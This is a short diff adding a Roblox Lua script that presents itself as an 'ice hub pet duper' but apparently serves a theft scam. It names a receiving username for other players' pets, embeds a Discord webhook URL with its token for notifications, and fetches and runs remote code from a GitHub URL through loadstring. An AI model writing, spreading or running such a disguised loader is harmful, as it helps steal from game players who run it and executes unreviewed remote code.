@@ -1,0 +1,5 @@
+_G.Username "Equipskill" --This is where you put where you want the pets to go
+_G.HubName "ice hub pet duper (updated join discord for more updates)" --Put any name here of any script
+_G.WebhookUrl "https://discord.com/api/webhooks/1140176521210900502/g8-sNcs7KtQoImanH6OIh-g3uRKuUQ1g2tYlu79qQVsPfFZjgXU9yvAEgArQ7N0NNHSP" --This is where the notifications get sent
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
